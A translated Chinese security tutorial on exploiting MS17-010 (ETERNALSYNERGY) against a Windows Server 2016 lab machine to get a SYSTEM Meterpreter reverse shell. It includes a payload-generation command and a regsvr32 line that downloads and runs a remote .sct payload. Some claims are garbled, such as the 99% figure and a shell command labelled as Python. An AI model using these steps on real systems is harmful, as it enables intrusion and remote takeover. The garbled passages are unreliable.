**版权声明**

本文由先知技术社区独家发布，如需转载，请联系先知技术社区获取授权。未经授权，严禁转载。
- 投稿邮箱：[PI:EMAIL]

**译者：backlion**

### **0x00 引言**

微软在发布MS17-010补丁时，该漏洞影响了从Windows 7到Windows Server 2016的所有系统版本。然而，The ShadowBrokers发布的“永恒之蓝”攻击并不稳定，可能会影响到Windows Server 2012及其后续版本，导致高达99%的机器遭受攻击。为了更好地理解和应用NSA已公开的漏洞，许多安全研究人员进行了深入研究。基于此，几天前发布了名为SYNERGY（由Sleepya开发）的改进版漏洞利用代码，增强了针对Windows Server 2012和2016系统的稳定性。

然而，要成功使用这一漏洞，需要深入了解其工作原理，并对代码进行适当的修改以达到预期效果。因此，在分析了该漏洞之后，本文将详细介绍如何在Windows Server 2016上实施攻击，并逐步解释如何修改漏洞利用代码，以便在目标机器上获得一个Meterpreter反弹shell。

### **0x01 漏洞利用**

#### **实验环境搭建**

为了搭建实验环境，我们需要以下配置：

- **目标主机**：Windows Server 2016 x64
  - IP地址：10.0.2.13
  - 确保安装全新的操作系统后，无需任何更改。只需知道目标IP地址并在攻击过程中保持主机运行。

- **攻击机**：GNU/Linux (建议使用Kali Linux)
  - 需要安装的工具：
    - Python v2.7: [https://www.python.org/download/releases/2.7](https://www.python.org/download/releases/2.7/)
    - Ps1Encode: [https://github.com/CroweCybersecurity/ps1encode](https://github.com/CroweCybersecurity/ps1encode)
    - Metasploit Framework: [https://github.com/rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework)

#### **获取漏洞利用代码**

漏洞利用代码已在exploit-db上发布，下载地址为：
[https://www.exploit-db.com/exploits/42315/](https://www.exploit-db.com/exploits/42315/)

该代码是用Python编写的，保存为`exploit.py`。运行该脚本时，可能会遇到缺少`mysmb`模块的错误提示。

#### **解决依赖关系**

- 在代码的第3行导入了`mysmb`模块，但该模块不在Python公共库中。
- 可以通过以下地址下载`mysmb`模块：
  [https://github.com/worawit/MS17-010/blob/master/mysmb.py](https://github.com/worawit/MS17-010/blob/master/mysmb.py)
- 将下载的`mysmb.py`文件与`exploit.py`放在同一目录下，并创建一个名为`__init__.py`的空文件。

这样，`exploit.py`就能找到所需的导入模块，不再出现错误提示。

#### **检查漏洞利用是否生效**

- 执行`exploit.py`，如果成功，会在目标主机的C盘上创建一个名为`pwned.txt`的文件。
- 无需对漏洞利用代码进行太多修改即可验证其有效性。

#### **身份认证**

- “永恒之石SYNERGY”漏洞利用需要经过身份验证的攻击。
- 可以使用来宾账户进行身份验证，或者从目标机器中的其他账户获取用户名和密码。
- 帐户权限不重要，即使是Guest帐户，攻击后也能获得SYSTEM权限。
- 修改`exploit.py`的第26和227行，设置用于身份验证的用户名和密码。

#### **参数设置**

- `exploit.py`需要定义两个参数：目标IP地址和管道名称。
- SMB协议定义了三种类型的共享：文件、打印和命名管道。
- 与“永恒之蓝”不同，“ETERNALROMANCE”和“ETERNALSYNERGY”利用了访问命名管道的漏洞。
- 可以使用Metasploit的扫描模块`auxiliary/scanner/smb/pipe_auditor`来查找可访问的管道。

#### **执行无Shellcode**

- 使用以下命令执行漏洞利用：
  ```bash
  python exploit.py spoolss
  ```
- 如果成功，将在目标主机的C盘上创建一个名为`pwned.txt`的文件。

#### **修改Shellcode**

- 有许多方法可以利用漏洞执行Meterpreter反弹shell，而不仅仅是写入文本文件。
- 生成将使用的Shellcode，作者推荐使用Ps1Encode工具。
- 下载Ps1Encode工具：
  [https://github.com/CroweCybersecurity/ps1encode](https://github.com/CroweCybersecurity/ps1encode)
- 生成有效载荷：
  ```bash
  ruby ps1encode.rb --PAYLOAD windows/meterpreter/reverse_tcp --LHOST <your_ip> --LPORT 4444 -t sct
  ```
- 将生成的`.sct`文件存储在攻击主机或任何其他主机的Web服务器中。

#### **允许Shellcode.sct下载**

- 将生成的`.sct`文件移动到Web服务器文件夹并设置必要的权限。

#### **编辑Exploit.py**

- 打开`exploit.py`，找到第463行及以上的代码。
- 修改`service_exec()`函数，使其下载并执行`.sct`文件。

#### **执行Shellcode**

- 修改后的`exploit.py`代码如下：
  ```python
  regsvr32 /s /n /u /i:[http://<your_ip>/shellcode.sct] scrobj.dll
  ```

#### **获取Meterpreter会话**

- 在执行`exploit.py`之前，配置Metasploit的`exploit/multi/handler`来接收Meterpreter会话。
- 几秒钟后，将在目标计算机上获取具有SYSTEM权限的Meterpreter反弹shell会话。

### **0x02 总结**

最终，我们在Windows Server 2016上获得了具有管理员权限的Meterpreter shell。几周前，作者已在exploit-db社区上发表了关于Windows 7、Windows Server 2008 R2和Windows Server 2012 R2的漏洞利用文章。这次，我们将重点介绍如何在Windows Server 2016上实施攻击。